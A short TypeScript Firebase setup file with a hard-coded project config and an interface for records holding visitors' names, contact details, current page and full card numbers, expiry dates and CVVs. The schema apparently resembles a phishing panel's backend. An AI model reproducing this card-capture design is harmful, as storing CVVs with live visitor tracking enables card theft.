import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAj8ZQC2zd07emzcDoWNspr-49aTOF_mb4",
  authDomain: "qaqa-c8411.firebaseapp.com",
  projectId: "qaqa-c8411",
  storageBucket: "qaqa-c8411.firebasestorage.app",
  messagingSenderId: "983908512508",
  appId: "1:983908512508:web:93afcd30f4ad6865addd79",
  measurementId: "G-3HGLL270KW"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

